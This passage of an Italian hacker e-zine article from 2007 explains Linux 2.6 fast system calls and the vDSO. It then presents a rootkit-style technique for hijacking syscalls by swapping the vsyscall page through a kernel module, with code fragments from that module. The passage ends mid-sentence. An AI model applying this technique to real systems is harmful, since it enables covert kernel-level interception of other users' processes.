@@ -1,0 +1,1735 @@
+================================================================================
+--------------------[ BFi14-dev - file 05 - 08 sep 2007 ]-----------------------
+================================================================================
+-[ HACKiNG ]--------------------------------------------------------------------
+---[ VSYSCALL PAGE HiJACKiNG ]--------------------------------------------------
+-----[ sbudella at gmail dot com ]----------------------------------------------
+
+
+***** Sommario.
+
+- Introduzione;
+- Fast System Call: sysenter;
+- Fast System Call: sysexit;
+- C Standard Library;
+- Vsyscall Page;
+- Vsyscall Page Hijacking: Fix-mapped Address vDSO;
+- Vsyscall Page Hijacking: Randomized Address vDSO;
+- Forging Custom Virtual Dynamic Shared Objects;
+- Codice e Considerazioni Finali;
+- Saluti;
+- Riferimenti. 
+
+***** Introduzione.
+
+Considerando alcune tra le tante nuove feature introdotte nel kernel Linux 2.6,
+possiamo affermare che una delle piu' critiche e verticali riguarda il tardivo
+supporto all'accoppiata di istruzioni sysenter/sysexit, previste dall'Intel
+instruction set[1]. Tali istruzioni, come avremo modo di approfondire in 
+seguito, permettono di effettuare richieste da User Mode a Kernel Mode in 
+maniera decisamente piu' efficiente e veloce rispetto alla loro controparte
+int/ret. Per richieste User Mode - Kernel Mode si intendono nello specifico
+i servizi offerti dalle syscall. Il kernel Linux implementa queste istruzioni
+mediante un particolare stratagemma chiamato vsyscall page.
+Il presente articolo illustra una nuova tecnica che consiste nello sfruttare
+questa caratteristica del kernel, permettendo ad un eventuale attaccante
+di intercettare e dirottare le syscall e di modificare il loro comportamento
+senza manipolare affatto la syscall table, o ricorrere a salti nel mezzo
+delle funzioni[2] (si veda silvio cesare), ecc.; praticamente seguendo una
+strada del tutto nuova che tra l'altro offre meritevoli spunti sulla
+possibilita' di realizzare degli hook user/kernel space concettualmente ibridi.
+La nostra attenzione si soffermera' sull'argomento syscall hijacking quindi,
+per una panoramica approfondita delle tecniche di kernel hacking fino ad ora
+utilizzate si consiglia la lettura dell'ottimo Linux Kernel Evil Programming
+Demystified[3] di Dark-Angel.
+
+***** Fast System Call: sysenter. 
+
+Dunque, prima di cominciare si rende necessario spiegare a quanti ancora non
+lo conoscano, il funzionamento del meccanismo sysenter/sysexit.
+Com'e' noto, fino al tuttora competitivo (e per certi versi insuperato) kernel
+2.4, Linux offriva come unica modalita' per invocare le chiamate di sistema 
+l'istruzione 'int $0x80' che sappiamo essere un salto a kernel space;
+precisamente accade che: la control unit carica nel code segment register %cs
+i 16 bit del Segment Selector del kernel __KERNEL_CS, mentre in %eip vengono
+caricati i 32 bit indicanti l'offset all'interno del kernel code segment al 
+quale salteremo: in poche parole si tratta dell'indirizzo del system call 
+handler, che si occupa di salvare alcuni registri sullo stack e di effettuare
+alcuni controlli di validita' sul numero di syscall invocato. Tuttavia tale 
+procedura e', come accennato, particolarmente lenta, causa diversi controlli
+effettuati dalla control unit sui privilegi di accesso intrinseci nei segmenti
+di sistema (DPL, CPL, ecc.). Per questo motivo la Intel ha pensato bene di
+introdurre la coppia sysenter/sysexit, sebbene ne siano dotati soltanto
+modelli di processore x86 abbastanza recenti. Quando la CPU si appresta ad
+eseguire una sysenter, essa copia ugualmente il segment selector del kernel
+in %cs, l'indirizzo del system call handler in %eip e lo stack pointer del
+kernel in %esp, cambiando dunque il contesto di esecuzione.
+La novita' rispetto alla metodologia precedente pero', consiste nel fatto che
+tali indirizzi sono memorizzati a initialization time in registri specifici 
+dipendenti dal modello di processore (MSR: Model-Specific Registers), 
+velocizzando dunque tutto il meccanismo in questione, rispetto al caso
+segment descriptors oriented. Vediamo come il kernel Linux prepara questi
+registri, chiamando appunto in fase di inizializzazione la funzione 
+enable_sep_cpu():
+
+/usr/src/linux/arch/i386/kernel/sysenter.c
+void enable_sep_cpu(void)
+{
+[...]
+	tss->ss1 = __KERNEL_CS;
+	tss->esp1 = sizeof(struct tss_struct) + (unsigned long) tss;
+	wrmsr(MSR_IA32_SYSENTER_CS, __KERNEL_CS, 0);
+	wrmsr(MSR_IA32_SYSENTER_ESP, tss->esp1, 0);
+	wrmsr(MSR_IA32_SYSENTER_EIP, (unsigned long) sysenter_entry, 0);
+	put_cpu();
+}
+
+Vediamo che la prima chiamata a wrmsr() copia il segment selector definito
+dalla macro __KERNEL_CS nel registro specifico MSR_IA32_SYSENTER_CS;
+successivamente si copia nel MSR_IA32_SYSENTER_ESP lo stack pointer relativo
+al task state segment locale: praticamente si utilizza la fine del task state
+segment stesso. L'ultimo passo e' quello di settare l'entry point del kernel
+indicato da sysenter_entry nel MSR_IA32_SYSENTER_EIP.
+Effettivamente, la differenza si nota solo a livello di chi si appresta ad
+esaminare o scrivere codice assembly con la nuova feature: gli argomenti
+di chiamata di sistema andranno sempre nei registri general purpose %ebx, %ecx,
+ecc., il numero di syscall richiesto sempre in %eax, mentre e' necessario
+un piccolo accorgimento; vediamone un esempio banale:
+
+<-| vdso/misc/hello.S |->
+.globl main
+mess:	.string "hello\n"
+main:
+	movl	$4,	%eax
+	movl	$0,	%ebx
+	movl	$mess,	%ecx
+	movl	$6,	%edx
+
+	/* you need these instructions below to use with sysenter */
+	__kernel_vsyscall:
+	pushl	%ecx
+	pushl	%edx
+	pushl	%ebp
+	movl	%esp,%ebp
+	sysenter
+
+<-X->
+
+Notare la differenza rispetto a un classico asm su linux che utilizzi
+int $0x80.
+Abbiamo bisogno di quelle quattro istruzioni in piu' per salvare %ecx, %edx ed
+%ebp sullo stack poiche' questi ultimi registri verranno utilizzati dal system
+call handler (sysenter_entry). Analizziamo brevemente quest'ultimo, almeno
+nelle parti pertinenti alla nostra trattazione:
+
+/usr/src/linux/arch/i386/kernel/entry.S
+ENTRY(sysenter_entry)
+[...]
+	ENABLE_INTERRUPTS(CLBR_NONE)
+	pushl $(__USER_DS)
+	CFI_ADJUST_CFA_OFFSET 4
+	pushl %ebp
+	CFI_ADJUST_CFA_OFFSET 4
+	CFI_REL_OFFSET esp, 0
+	pushfl
+	CFI_ADJUST_CFA_OFFSET 4
+	pushl $(__USER_CS)
+	CFI_ADJUST_CFA_OFFSET 4
+[...] 
+	pushl $SYSENTER_RETURN
+
+Dunque, possiamo vedere che abilitiamo gli interrupt locali con la prima 
+istruzione; salviamo sul kernel mode stack il segment selector di user data,
+%ebp, il contenuto del registro eflags, il segment selector dello user code ed
+infine l'indirizzo di SYSENTER_RETURN, ovvero il codice da eseguire dopo essere
+usciti dal syscall handler. Questi valori sullo stack serviranno a ristabilire
+il contesto di esecuzione in user mode, dopo aver eseguito la syscall service
+routine, cioe' il codice della chiamata di sistema vero e proprio.
+Di tale lavoro se ne occupa sysexit.
+
+***** Fast System Call: sysexit.
+
+A questo punto, ipotizzando di aver eseguito proprio la syscall service
+routine, non ci resta che fare ritorno allo user mode. Prima di cio',
+l'esecuzione ritorna al syscall handler: in %edx viene memorizzato l'indirizzo
+di SYSENTER_RETURN che, come abbiamo visto poc'anzi, e' stato pushato sullo
+stack.
+Dopodiche' si esegue finalmente sysexit. Questa istruzione non fa altro che
+settare il code segment register %cs con il valore dello user code segment:
+per velocizzare il tutto si copia il valore del registro MSR_IA32_SYSENTER_CS
+sommato a 16, il che equivale proprio al valore macro __USER_CS. Alla stessa
+maniera (+24) viene settato %ss con lo user data segment selector; in %eip
+invece viene copiato il valore di %edx, cioe' SYSENTER_RETURN.
+Questa etichetta delimita le seguenti istruzioni, eseguite quindi in user mode:
+
+SYSENTER_RETURN:	
+	popl	%ebp
+	popl	%edx
+	popl	%ecx
+	ret
+
+Infatti se si ricorda, abbiamo salvato tali valori sullo user mode stack
+prima di operare sysenter. 
+Adesso proviamo a sottolineare i domini di esecuzione di tutto il procedimento
+appena descritto, cogliendo l'occasione per riassumere una non molto intuitiva
+esposizione: 
+
+	1. programma -> USER MODE -> __kernel_vsyscall
+	2. __kernel_vsyscall -> USER MODE -> sysenter
+	3. sysenter -> KERNEL MODE -> sysenter_entry handler
+	4. sysenter_entry handler -> KERNEL MODE -> syscall service routine
+	5. syscall service routine -> KERNEL MODE -> sysenter_entry handler
+	6. sysenter_entry handler -> KERNEL MODE -> sysexit
+	7. sysexit -> USER MODE -> SYSENTER_RETURN 
+
+Bene, ora che abbiamo fatto nostro il funzionamento del fast system call,
+possiamo introdurre un comprimario fondamentale per la nostra faccenda.
+Si invita il lettore a soffermarsi in modo particolare sui punti 1, 2 e 7 
+dello schema di cui sopra. 
+
+***** C Standard Library. 
+
+Nel punto 1 abbiamo detto che il programma in esecuzione accede alla
+__kernel_vsyscall label in user mode ogni qualvolta si accinge a fare una 
+chiamata di sistema. La totalita' dei programmi Linux, siano essi statici o 
+dinamici, utilizza il supporto della libreria standard, la libc per intenderci,
+che consiste in una collezione di wrapper utili per semplificare il passaggio
+di richieste al kernel mediante syscall, cioe': quando chiediamo di scrivere
+sullo stdout con una printf, e' la standard library che per noi si occupa
+di tradurre la chiamata da user space a kernel space, ovvero setta %eax
+con il syscall number appropriato e successivamente i registri general purpose
+con  gli argomenti necessari; in seguito deve eseguire lo switch vero e proprio
+cambiando il dominio di esecuzione, e lo fa proprio con sysenter, nel caso
+sia supportato dal processore, o con int $0x80 in caso contrario.
+Vediamo una conferma:
+
+sbudella@hannibal:~$ objdump -d /lib/libc-2.5.so > libc.2.5.dump
+
+Cerchiamo un wrapper qualsiasi:
+
+[...]
+   c2890:       89 da                   mov    %ebx,%edx
+   c2892:       8b 5c 24 04             mov    0x4(%esp),%ebx
+   c2896:       b8 28 00 00 00          mov    $0x28,%eax
+   c289b:       cd 80                   int    $0x80
+[...]
+ 
+Le prime due istruzioni non ci interessano; e' importante invece notare che
+in %eax viene posto il valore del syscall number (in questo caso si tratta
+di rmdir, se fosse stato il wrapper write avremmo posto il valore 0x4, si veda
+/usr/include/asm/unistd.h); successivamente facciamo il salto a kernel space
+con la vecchia int $0x80. Questo e' dunque in via generale, il comportamento
+di un wrapper di libc che fa da trampoline tra user e kernel space.
+Adesso proviamo a fare altrettanto con la nuovissima libc-2.6:
+
+sbudella@hannibal:~$ objdump -d /lib/libc-2.6.so > libc.2.6.dump
+
+[...]
+   b2740:       89 da                   mov    %ebx,%edx
+   b2742:       8b 5c 24 04             mov    0x4(%esp),%ebx
+   b2746:       b8 28 00 00 00          mov    $0x28,%eax
+   b274b:       65 ff 15 10 00 00 00    call   *%gs:0x10
+[...]
+
+Notare come sia cambiata l'ultima istruzione. Abbiamo trovato una call davvero
+particolare al posto dell'istruzione classica int. Dunque la nuova libc
+gestisce il trampoline a kernel space in modo del tutto diverso, e questo, si
+tiene a sottolinearlo, e' valido per i wrapper di tutte le altre syscall, non
+solo per quella in esame. Tuttavia dobbiamo indagare la natura di quella
+singolare call:
+costruiamo un semplicissimo programma di prova che utilizzi proprio questa call
+e vediamo cosa succede; in questo caso ci riferiamo a write per immediatezza:
+
+<-| vdso/misc/hello_call.S |->
+.globl main
+mess:	.string "hello\n"
+main:
+	movl	$4,	%eax
+	movl	$0,	%ebx
+	movl	$mess,	%ecx
+	movl	$6,	%edx
+	
+	/* where am I going? */
+	call	*%gs:0x10
+
+<-X->
+
+sbudella@hannibal:~$ gcc -o hello_call hello_call.S
+sbudella@hannibal:~$ ./hello_call
+hello
+sbudella@hannibal:~$
+
+Non abbiamo fatto altro che emulare il comportamento di un piu' generico
+wrapper della nuova libc 2.6. E' evidente che la nostra sys_write viene
+eseguita perfettamente. Possiamo affermare con certezza che tra sysenter e int,
+almeno una di esse e' stata passata al processore, poiche' uniche modalita' per
+effettuare salti a kernel space.
+Infatti, sfogliando i sorgenti della libc 2.6 ci si convince di cio':
+
+glibc-2.6/sysdeps/unix/sysv/linux/i386/sysdep.h
+[...]
+#ifdef I386_USE_SYSENTER
+# ifdef SHARED
+#  define ENTER_KERNEL call *%gs:SYSINFO_OFFSET
+# else
+#  define ENTER_KERNEL call *_dl_sysinfo
+# endif
+#else
+# define ENTER_KERNEL int $0x80
+#endif
+[...]
+
+Da questo deduciamo che il registro %gs punta ad un segmento di codice
+aggiuntivo il quale, considerando uno spiazzamento di 0x10 bytes,
+deve senza ombra di dubbio contenere una delle due istruzioni suddette.
+
+***** Vsyscall Page.
+
+Il mistero e' presto svelato: il codice in questione, che possiamo definire
+come un prologo al salto a kernel space, e' memorizzato in una ben precisa
+locazione di memoria del kernel. Infatti il kernel Linux in fase di
+inizializzazione alloca un page frame, la vsyscall page appunto, contenente
+un vDSO (virtual dynamic shared object) di esigue dimensioni, il cui entry
+point e' proprio __kernel_vsyscall, il codice visto prima. Ma c'e' dell'altro.
+Abbiamo detto che non tutti i modelli di processore x86 beneficiano del
+supporto fast system call, dunque si rende necessario risolvere un problema di
+compatibilita': la standard library non puo' certo discriminare i due casi
+di syscall access, ed infatti questo e' compito del kernel. Esaminiamo il
+codice incaricato di fare quanto discusso:
+
+/usr/src/linux/arch/i386/kernel/sysenter.c
+[...]
+extern const char vsyscall_int80_start, vsyscall_int80_end;
+extern const char vsyscall_sysenter_start, vsyscall_sysenter_end;
+static struct page *syscall_pages[1];
+
+int __init sysenter_setup(void)
+{
+        void *syscall_page = (void *)get_zeroed_page(GFP_ATOMIC);
+        syscall_pages[0] = virt_to_page(syscall_page);
+
+Innanzi tutto e' importante dire che ad ogni page frame e' associato un
+descrittore di tipo "struct page" che si occupa di mantenerne le informazioni
+di stato. Pertanto dichiariamo un nuovo page descriptor di nome syscall_pages
+(o meglio un array di page descriptor di un solo elemento). Invece richiediamo
+al kernel di allocare una pagina vera e propria di nome syscall_page con
+get_zeroed_page(), e la correliamo al suo page descriptor con la macro
+virt_to_page(), che restituisce appunto l'indirizzo in memoria del descrittore.
+
+#ifdef CONFIG_COMPAT_VDSO
+        __set_fixmap(FIX_VDSO, __pa(syscall_page), PAGE_READONLY_EXEC);
+        printk("Compat vDSO mapped to %08lx.\n", __fix_to_virt(FIX_VDSO));
+#endif
+
+I primi kernel ad implementare la vsyscall page mappavano quest'ultima ad
+un indirizzo virtuale fisso, tant'e' che anche le release piu' recenti
+abilitano tale modello su richiesta in fase di configurazione. Spieghiamo.
+Ogni indirizzo lineare L su Linux ha corrispondente indirizzo fisico P secondo:
+
+	P = L - 0xc0000000;
+
+Un fix-mapped linear address invece e' semplicemente un indirizzo fisico
+mappato in modo arbitrario. __set_fixmap e' la macro che si occupa quindi di
+associare un physical address con un fix-mapped linear address.
+Tuttavia questa vsyscall page fissa e' stata accantonata per motivi di
+sicurezza[4] in favore di un vDSO mappato linearmente ad indirizzi random.
+Ma di questo parleremo in seguito. Proseguiamo la nostra analisi:
+
+        if (!boot_cpu_has(X86_FEATURE_SEP)) {
+		memcpy(syscall_page,
+			&vsyscall_int80_start,
+			&vsyscall_int80_end - &vsyscall_int80_start);
+		return 0;
+	}
+
+	memcpy(syscall_page,
+		&vsyscall_sysenter_start,
+		&vsyscall_sysenter_end - &vsyscall_sysenter_start);
+
+	return 0;
+}
+
+E' qui che controlliamo la presenza del sep bit (la fast system call facility)
+con la macro boot_cpu_has(): nel caso sia assente copiamo nel nostro page frame
+il vDSO contenente il seguente codice (all'indirizzo vsyscall_int80_start):
+
+/usr/src/linux/arch/i386/kernel/vsyscall-int80.S
+[...]
+__kernel_vsyscall:
+.LSTART_vsyscall:
+        int $0x80
+        ret
+.LEND_vsyscall:
+[...]
+
+Altrimenti copia il vDSO con supporto sysenter (all'indirizzo
+vsyscall_sysenter_start), cioe' il codice a noi familiare:
+
+/usr/src/linux/arch/i386/kernel/vsyscall-sysenter.S
+[...]
+__kernel_vsyscall:
+.LSTART_vsyscall:
+        push %ecx
+.Lpush_ecx:
+        push %edx
+.Lpush_edx:
+        push %ebp
+.Lenter_kernel:
+        movl %esp,%ebp
+        sysenter
+
+        /* 7: align return point with nop's to make disassembly easier */
+        .space 7,0x90
+
+        /* 14: System call restart point is here! (SYSENTER_RETURN-2) */
+        jmp .Lenter_kernel
+        /* 16: System call normal return point is here! */
+        .globl SYSENTER_RETURN  /* Symbol used by sysenter.c  */
+SYSENTER_RETURN:
+        pop %ebp
+.Lpop_ebp:
+        pop %edx
+.Lpop_edx:
+        pop %ecx
+.Lpop_ecx:
+        ret
+.LEND_vsyscall:
+[...]
+
+In entrambe le situazioni viene quindi definita la label __kernel_vsyscall.
+Cerchiamo di riordinare un po' le idee. Il codice di __kernel_vsyscall e'
+dunque residente in KERNEL SPACE; finora abbiamo asserito che a tale codice
+vi accede la libc utilizzando la 'call *%gs:0x10' da USER SPACE in modo tale
+da richiamare sysenter o int $0x80 a seconda dei casi. Come e' possibile?
+La soluzione a questa incongruenza e' che i processi in esecuzione in procinto
+di richiamare una syscall mediante libc+call, non accedono direttamente
+alla vsyscall page in kernel memory: essa e' bensi' mappata nell'address space
+di ogni processo in esecuzione a run time, sottoforma di memory region,
+dimodoche' la nostra call a __kernel_vsyscall e' una call ad un indirizzo
+appartenente allo spazio di indirizzamento del processo. Infatti: 
+
+sbudella@hannibal:~$ cat /proc/self/maps
+08048000-0804c000 r-xp 00000000 03:01 1267       /bin/cat
+0804c000-0804d000 rw-p 00003000 03:01 1267       /bin/cat
+0804d000-0806e000 rw-p 0804d000 00:00 0          [heap]
+[...]
+b7e9b000-b7fc4000 r-xp 00000000 03:01 102966     /lib/libc-2.6.so
+b7fc4000-b7fc6000 r--p 00129000 03:01 102966     /lib/libc-2.6.so
+b7fc6000-b7fc7000 rw-p 0012b000 03:01 102966     /lib/libc-2.6.so
+b7fc7000-b7fcb000 rw-p b7fc7000 00:00 0 
+[...]
+b7fcf000-b7fd0000 r-xp b7fcf000 00:00 0          [vdso]
+b7fd0000-b7feb000 r-xp 00000000 03:01 12503      /lib/ld-2.6.so
+b7feb000-b7fec000 r--p 0001a000 03:01 12503      /lib/ld-2.6.so
+b7fec000-b7fed000 rw-p 0001b000 03:01 12503      /lib/ld-2.6.so
+bfb95000-bfbab000 rw-p bfb95000 00:00 0          [stack]
+
+Vediamo che all'indirizzo 0xb7fcf000 comincia la memory region contenente il
+nostro vDSO. La funzione che si occupa di mappare per noi la vsyscall page
+e' arch_setup_additional_pages(), richiamata in fase di creazione di qualsiasi
+processo dall'imponente load_elf_binary() definita in 
+/usr/src/linux/fs/binfmt_elf.c; vediamo uno stralcio della prima:
+
+/usr/src/linux/arch/i386/kernel/sysenter.c 
+[...]
+int arch_setup_additional_pages(struct linux_binprm *bprm, int exstack)
+{
+        struct mm_struct *mm = current->mm;
+        unsigned long addr;
+        int ret;
+
+        down_write(&mm->mmap_sem);
+        addr = get_unmapped_area(NULL, 0, PAGE_SIZE, 0, 0);
+[...]
+
+La funzione get_unmapped_area() ci restituisce l'indirizzo della prima memory
+region disponibile nello spazio di indirizzamento del processo corrente
+(current, per l'appunto).
+
+	ret = install_special_mapping(mm, addr, PAGE_SIZE,
+                                      VM_READ|VM_EXEC|
+                                      VM_MAYREAD|VM_MAYWRITE|VM_MAYEXEC|
+                                      VM_ALWAYSDUMP,
+                                      syscall_pages);
+        if (ret)
+                goto up_fail;
+
+        current->mm->context.vdso = (void *)addr;
+        current_thread_info()->sysenter_return =
+                                    (void *)VDSO_SYM(&SYSENTER_RETURN);
+[...]
+
+La parte piu' importante di tutto il nostro discorso, e forse anche la piu'
+utile ai nostri scopi futuri, e' quella relativa a install_special_mapping().
+Vediamo solamente com'e' definita:
+
+/usr/src/linux/mm/mmap.c
+[...]
+int install_special_mapping(struct mm_struct *mm,
+                            unsigned long addr, unsigned long len,
+                            unsigned long vm_flags, struct page **pages)
+[...]
+
+Il commento nello stesso sorgente ci dice gia' tutto: la funzione inserisce
+nell'address space descritto da 'mm' del processo (nel nostro caso
+current->mm), una nuova vm_area_struct, cioe' una nuova memory region per
+intenderci.
+I page frame da mappare sono dati dall'array struct page **pages: infatti
+noi abbiamo passato come argomento syscall_pages, che se si ricorda era
+stato dichiarato stranamente proprio come array di un solo elemento. 
+Pertanto e' install_special_mapping che affettua la mappatura vera e propria
+in base ai page frame passatigli.
+Dunque e' proprio su quel 'static struct page *syscall_pages[1];' dichiarato
+in precedenza che dobbiamo lavorare.
+
+***** Vsyscall Page Hijacking: Fix-mapped Address vDSO.
+
+E' giunto il momento di elaborare una qualche idea per sovvertire tutto il
+meccanismo finora discusso. Iniziamo il nostro percorso prendendo prima in
+considerazione il caso in cui il vDSO sia mappato secondo il fix-mapping:
+
+sbudella@hannibal:~$ dmesg | grep -i vdso
+Compat vDSO mapped to ffffe000.
+sbudella@hannibal:~$
+
+Ci si ricordi un attimo dell'eventualita' di questo risultato: il nostro
+kernel e' stato compilato con l'opzione CONFIG_COMPAT_VDSO; infatti:
+
+sbudella@hannibal:~$ grep CONFIG_COMPAT_VDSO /boot/compat/config
+CONFIG_COMPAT_VDSO=y
+sbudella@hannibal:~$
+
+Revisionando il codice del kernel, come abbiamo visto, la macro __set_fixmap
+ha associato per noi il page frame contenente il vDSO ad un indirizzo lineare
+fisso, nel nostro caso (ed in tutti gli altri casi) 0xffffe000.
+Se proprio si vuol essere pignoli, possiamo ricavare l'intero vDSO
+direttamente dalla memoria di un processo a scelta, con una prassi nota a
+tutti gli utenti Linux:
+
+sbudella@hannibal:~$ dd if=/proc/self/mem of=vdso bs=4096 count=1 skip=1048574
+1+0 records in
+1+0 records out
+4096 bytes (4.1 kB) copied, 0.000155304 s, 26.4 MB/s
+sbudella@hannibal:~$ file vdso
+vdso: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), stripped
+sbudella@hannibal:~$ objdump -d vdso > vdso.dump
+sbudella@hannibal:~$ head -23 vdso.dump
+
+vdso:     file format elf32-i386
+
+Disassembly of section .text:
+
+ffffe400 <__kernel_vsyscall>:
+ffffe400:       51                      push   %ecx
+ffffe401:       52                      push   %edx
+ffffe402:       55                      push   %ebp
+ffffe403:       89 e5                   mov    %esp,%ebp
+ffffe405:       0f 34                   sysenter
+ffffe407:       90                      nop
+ffffe408:       90                      nop
+ffffe409:       90                      nop
+ffffe40a:       90                      nop
+ffffe40b:       90                      nop
+ffffe40c:       90                      nop
+ffffe40d:       90                      nop
+ffffe40e:       eb f3                   jmp    ffffe403 <__kernel_vsyscall+0x3>
+ffffe410:       5d                      pop    %ebp
+ffffe411:       5a                      pop    %edx
+ffffe412:       59                      pop    %ecx
+ffffe413:       c3                      ret
+sbudella@hannibal:~$
+
+Si nota benissimo come la label __kernel_vsyscall, l'entry point del vDSO,
+sia a +0x400 bytes dall'inizio del file; inoltre e' indubbio che sia attivato
+il supporto alla fast system call facility, sysenter e' visibilissimo.
+Se si seguisse lo stesso procedimento su una macchina piu' in la' con gli anni:
+
+sbudella@miranda:~$ head vdso.dump
+
+vdso:     file format elf32-i386
+
+Disassembly of section .text:
+
+ffffe400 <__kernel_vsyscall>:
+ ffffe400:   cd 80                   int    $0x80
+ ffffe402:   c3                      ret
+ ffffe403:   90                      nop
+ ffffe404:   90                      nop
+sbudella@miranda:~$
+
+Bene, adesso che abbiamo dato anche una dimostrazione pratica dettagliata di
+quello che giunge agli occhi dell'utente finale , torniamo alla nostra
+tabella di marcia. Le nostre intenzioni iniziali riguardavano il syscall
+hijacking: come possiamo congiungere tale tecnica di hacking con la vsyscall
+page? La risposta e' abbastanza semplice; nel caso fix-mapped vDSO lo e' ancor
+piu': sostanzialmente si tratta di abolire la correlazione tra il physical
+address del vsyscall page frame ed il suo indirizzo lineare fixed. In seguito
+allochiamo un nuovo page frame che conterra' una versione modificata ad-hoc
+del vDSO originale, la quale svolgera' il compito di hook vero e proprio.
+Infine stabiliamo un nuovo fix-mapping tra il nostro page frame "maligno" e
+l'indirizzo lineare fixed, che corrispondera' sempre a 0xffffe000,
+dimodoche' quando la libc effettuera' la chiamata 'call *%gs:0x10', l'eip
+saltera' direttamente al nostro __kernel_vsyscall rimaneggiato.
+Esaminiamo ora il codice allegato prodotto dal vostro umile autore:
+per eseguire il primo obiettivo, cioe' la de-mappatura dell'indirizzo, ci
+serviamo della macro clear_fixmap, che altro non e' che una chiamata alla gia'
+nota __set_fixmap in un modo un po' singolare:
+
+/usr/src/linux/asm-i386/fixmap.h
+[...]
+#define clear_fixmap(idx) \
+                __set_fixmap(idx, 0, __pgprot(0))
+[...]
+
+Il parametro idx informa il kernel sul tipo di mappatura di cui abbiamo
+bisogno: nel nostro caso dobbiamo utilizzare il valore FIX_VDSO. 
+Nota: il simbolo di __set_fixmap non e' esportato, percio' e' necessario
+ricavarlo dal System.map sincronizzato con il kernel corrente. Quindi:
+
+vdso/vdso_hack.c
+[...]
+unsigned long __set_fixmap_addr = SET_FIXMAP_ADDR;
+module_param(__set_fixmap_addr,long,0);
+[...]
+        void (*__set_fixmap_)(enum fixed_addresses idx,unsigned long phys,
+                        pgprot_t flags) = (void *) SET_FIXMAP_ADDR;
+
+        __set_fixmap_ = (void *) __set_fixmap_addr;
+[...]
+	#ifdef CONFIG_COMPAT_VDSO
+        /* equivalent to clear_fixmap(FIX_VDSO) */
+        __set_fixmap_(FIX_VDSO,0,__pgprot(0));
+[...]
+
+Tutto questo non prima di aver allocato un nuovo page frame per il nostro vdso:
+
+vdso/vdso_hack.c
+[...]
+	void *new_syscall_page = (void *) get_zeroed_page(GFP_ATOMIC);
+[...]
+
+Adesso possiamo rieffettuare la mappatura mediante FIX_VDSO sempre allo stesso
+fix-mapped linear address 0xffffe000:
+
+vdso/vdso_hack.c
+[...]
+        /* new fixmapping for the vsyscall page */
+        __set_fixmap_(FIX_VDSO,__pa(new_syscall_page),PAGE_READONLY_EXEC);
+[...]
+
+Bene, non ci resta che copiare nel nuovo page frame il nostro vDSO
+customizzato:
+
+vdso/vdso_hack.c
+[...]
+        if(!boot_cpu_has(X86_FEATURE_SEP)) {
+                memcpy(new_syscall_page,mcnamara,MCNAMARA_SIZE);
+                return 0;
+        }
+
+        memcpy(new_syscall_page,troy,TROY_SIZE);
+[...]
+
+Si noti come discriminiamo i casi int80 o sysenter, copiando nel primo caso
+il codice della funzione mcnamara, mentre nel secondo il codice della funzione
+troy, implementate entrambe con un piccolo stratagemma:
+
+vdso/vdso_hack.c
+[...]
+/* modify these paths to resemble your cwd */
+#define MCNAMARA_INCBIN         ".incbin \"/home/sbudella/src/vdso/mcnamara\""
+#define TROY_INCBIN             ".incbin \"/home/sbudella/src/vdso/troy\""
+[...]
+void mcnamara(void)
+{
+        __asm__(MCNAMARA_INCBIN);
+}
+
+void troy(void)
+{
+        __asm__(TROY_INCBIN);
+}
+[...]
+
+Niente di piu' semplice: le due funzioni contengono il codice dei binari dei
+vDSO che abbiamo modificato per performare i nostri futuri hook, ma di questo
+parleremo in seguito. Ora urge concludere il discorso sull'hijacking vero e
+proprio della vsyscall page: studiamo il caso in cui l'indirizzo del vDSO
+nell'address space del processo sia randomizzato.
+
+***** Vsyscall Page Hijacking: Randomized Address vDSO. 
+
+E' risaputo che il layout dello spazio di indirizzamento di un processo, nel
+nuovo kernel 2.6, puo' assumere due aspetti principali: quello classico,
+secondo cui la mappatura di memory regions aggiuntive a text, data, bss e heap
+comincia dall'indirizzo lineare 0x40000000, e quindi in modo progressivamente
+incrementale verso indirizzi lineari crescenti; dall'altra parte abbiamo il
+recente memory layout flessibile, il quale prevede che il mapping di regioni
+aggiuntive avvenga a partire dalla fine dello user mode stack via verso
+indirizzi lineari decrescenti, pertanto la configurazione di memoria dipende
+da quanto ci si aspetta che lo stack cresca. Nelle situazioni in cui lo stack
+puo' crescere illimitatamente, il kernel decide di utilizzare il layout
+classico, altrimenti la scelta ricade sulla seconda modalita' (si veda
+/usr/src/linux/arch/i386/mm/mmap.c). Inutile dire che nel secondo caso ci si
+ritrova con una configurazione di memoria in cui gli indirizzi lineari delle
+memory regions sono randomizzati, e quello del vDSO non fa eccezione.
+Infatti, utilizzando un kernel tale che:
+
+sbudella@hannibal:~$ grep CONFIG_COMPAT_VDSO /boot/config
+# CONFIG_COMPAT_VDSO is not set
+sbudella@hannibal:~$
+
+la memory region alla quale e' stata mappata la vsyscall page ha un indirizzo
+lineare non predicibile, a meno che l'amministratore non abbia impostato
+lo stack in modo tale da assumere dimensioni illimitate.
+In queste situazioni la nostra strategia deve altresi' cambiare.
+Dobbiamo ricordare anzitutto la funzione install_special_mapping() menzionata
+poco prima: abbiamo passato come ultimo argomento l'array *syscall_pages[1]
+di page descriptor, cosicche' essa potesse mappare il page frame correlato
+a tale page descriptor con una memory region nell'address space del processo
+corrente. Pertanto se vogliamo che venga mappata la nostra vsyscall page
+manipolata dobbiamo far si' che quell'unico descrittore di page frame si
+riferisca al __nostro__ page frame, precedentemente allocato e contenente il
+codice del vDSO modificato per l'occasione: di questo passo non facciamo altro
+che alterare l'indirizzo a cui punta il page descriptor da passare ad
+install_special_mapping(). Si tratta di una manciata di codice C, e ricordando
+che il simbolo di syscall_pages non e' esportato, risulta:
+
+vdso/vdso_hack.c
+[...]
+unsigned long syscall_pages_addr = SYSCALL_PAGES_ADDR;
+module_param(syscall_pages_addr,long,0);
+[...]
+        struct page **o_syscall_pages = (struct page **) SYSCALL_PAGES_ADDR;
+[...]
+        o_syscall_pages = (struct page **) syscall_pages_addr;
+[...]
+
+Referenziamo il nostro page frame al page descriptor ufficiale con la seguente
+istruzione:
+
+vdso/vdso_hack.c
+[...]
+        o_syscall_pages[0] = virt_to_page(new_syscall_page);
+[...]
+
+Dove new_syscall_page e' stato allocato anzitempo (si veda il paragrafo
+precedente). In seguito copiamo nel page frame il codice del vDSO troy o
+mcnamara, come gia' visto. Ed e' proprio dell'argomento riguardante la modifica
+dei vDSO, con relativa metodologia per implementare gli hook delle syscall,
+che dobbiamo ancora discutere.
+
+***** Forging Custom Virtual Dynamic Shared Objects.
+
+I vDSO che in condizioni normali il kernel Linux copierebbe nella vsyscall
+page vengono assemblati e linkati in fase di compilazione del kernel stesso:
+essi sono vsyscall-int80.so e vsyscall-sysenter.so, costruiti mediante uno
+script aggiuntivo del linker ld(1). Diamo un'occhiata alle sue parti piu'
